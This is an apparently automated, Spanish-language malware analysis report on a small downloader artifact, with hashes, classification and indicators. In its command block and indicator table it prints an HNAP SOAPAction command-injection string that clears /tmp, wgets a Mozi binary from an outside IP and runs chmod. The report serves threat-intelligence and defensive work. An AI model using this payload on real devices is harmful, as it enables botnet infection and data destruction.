# 🧬 Payload Analysis

`a61b754f4d90ca6efb4aeff83951f5e0b633bedd6d7f9737bc8fb2bc10ac76b0`

## 📌 Resumen

Artefacto identificado como ASCII text, with very long lines (531), with CRLF line terminators de 796 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `HNAP1` en `hxxp://purenetworks[.]com/HNAP1/`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:58:55.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `a61b754f4d90ca6efb4aeff83951f5e0b633bedd6d7f9737bc8fb2bc10ac76b0`
- **SHA1:** `b1cf89885e7ff225a93f1691ae76ad8039e289e3`
- **MD5:** `be198bd24b9b7f77144dcad8b3894091`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (531), with CRLF line terminators |
| Tamaño | 796 B |
| Entropía | 5.41 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (531), with CRLF line terminators; iocs=9

## 🖥️ Comandos observados / extraídos

```text
SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://172.168.176.XXX:47500/Mozi.m && chmod 777
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://purenetworks[.]com/HNAP1/ | strings |
| url | hxxp://www[.]w3[.]org/2001/XMLSchema-instance | strings |
| url | hxxp://www[.]w3[.]org/2001/XMLSchema | strings |
| url | hxxp://172.168.176.XXX:47500/Mozi.m | strings |
| url | hxxp://schemas[.]xmlsoap[.]org/soap/envelope/ | strings |
| ip | 190.179.160.XXX | static_analysis |
| ip | 172.168.176.XXX | static_analysis |
| command | SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://172.168.176.XXX:47500/Mozi.m && chmod 777 | strings |
| hash | a61b754f4d90ca6efb4aeff83951f5e0b633bedd6d7f9737bc8fb2bc10ac76b0 | static_analysis |
| ip | 103.74.21.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
